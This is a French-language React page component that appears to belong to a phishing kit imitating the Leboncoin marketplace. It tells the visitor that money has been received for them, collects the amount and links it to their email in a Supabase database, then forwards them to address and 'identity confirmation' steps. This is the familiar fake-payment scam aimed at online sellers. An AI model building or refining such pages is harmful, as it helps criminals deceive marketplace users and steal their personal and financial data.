import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "@/components/Footer";
import Header from "@/components/Header";
import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
import { upsertUser } from "@/utils/supabaseClient";
import { toast } from "sonner";

const PaymentNotification: React.FC = () => {
  const [montant, setMontant] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    // Récupérer le montant de la session s'il existe déjà
    const userData = getFromSession("userData");
    if (userData && userData.montant) {
      setMontant(userData.montant);
    }
  }, []);

  const handleContinue = async () => {
    if (!montant) {
      toast.error("Veuillez entrer un montant");
      return;
    }

    setIsLoading(true);

    try {
      const userData = getFromSession("userData");
      const email = userData?.email;

      if (email) {
        // Sauvegarder dans la session
        updateUserSession({ montant });

        // Sauvegarder dans Supabase
        await upsertUser({
          email,
          montant
        });
      } else {
        // Si pas d'email (ne devrait pas arriver si le flux est respecté), on sauvegarde juste en session pour l'instant
        updateUserSession({ montant });
      }

      navigate("/address-confirmation");
    } catch (error) {
      console.error("Erreur lors de la sauvegarde du montant:", error);
      toast.error("Une erreur est survenue");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-lg px-6 py-10 bg-white rounded-lg animate-fade-in">
          <h1 className="text-3xl font-bold text-center mb-6">
            Vous avez reçu de l'argent aujourd'hui
          </h1>

          <div className="flex justify-center mb-8 opacity-90">
            <img
              src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTUwIDEyLjVINjBWNjBINTBINDVIMTAiIHN0cm9rZT0iI0ZGNkUxNCIgc3Ryb2tlLXdpZHRoPSI0IiBzdHJva2UtbGluZWNhcD0icm91bmQiLz4KPHBhdGggZD0iTTIwIDI1SDUwIiBzdHJva2U9IiNGRjZFMTQiIHN0cm9rZS13aWR0aD0iNCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIi8+CjxwYXRoIGQ9Ik0xMCA0MEg1MCIgc3Ryb2tlPSIjRkY2RTE0IiBzdHJva2Utd2lkdGg9IjQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSIxNSIgZmlsbD0id2hpdGUiIHN0cm9rZT0iI0ZGNkUxNCIgc3Ryb2tlLXdpZHRoPSI0Ii8+CjxwYXRoIGQ9Ik00NCA1MEw0OCA1NEw1NiA0NiIgc3Ryb2tlPSIjRkY2RTE0IiBzdHJva2Utd2lkdGg9IjQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8L3N2Zz4K"
              alt="Document Icon"
              className="w-20 h-20 mb-4"
            />
          </div>

          <p className="text-center text-gray-700 mb-8">
            Pour approuver la transaction suivez utilisez le bouton-ci dessous et suivez les instructions. Pour lutter contre les transactions frauduleuse, une confirmation d'identité peut être requise
          </p>

          <div className="mb-8">
            <label htmlFor="montant" className="block text-sm font-medium text-gray-700 mb-2 text-center">
              Montant de la transaction
            </label>
            <div className="relative max-w-xs mx-auto">
              <input
                type="text"
                id="montant"
                value={montant}
                onChange={(e) => setMontant(e.target.value)}
                placeholder="Ex: 150,00€"
                className="block w-full rounded-md border-gray-300 pl-4 pr-12 py-3 text-center text-lg focus:border-leboncoin-orange focus:ring-leboncoin-orange shadow-sm border"
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <span className="text-gray-500 sm:text-sm">€</span>
              </div>
            </div>
          </div>

          <div className="mb-10">
            <h3 className="text-center font-medium text-gray-800 mb-4">Voici les étapes à suivre:</h3>
            <ul className="space-y-3">
              <li className="flex items-start text-gray-700">
                <span className="text-leboncoin-orange mr-2">›</span>
                <p>Cliquez sur continuer pour commencer.</p>
              </li>
              <li className="flex items-start text-gray-700">
                <span className="text-leboncoin-orange mr-2">›</span>
                <p>Confirmez votre identité.</p>
              </li>
              <li className="flex items-start text-gray-700">
                <span className="text-leboncoin-orange mr-2">›</span>
                <p>Recevez votre paiement sur votre compte.</p>
              </li>
            </ul>
          </div>

          <button
            onClick={handleContinue}
            className="primary-button flex justify-center items-center"
            disabled={isLoading}
          >
            {isLoading ? (
              <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></span>
            ) : null}
            Continuer
          </button>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default PaymentNotification;
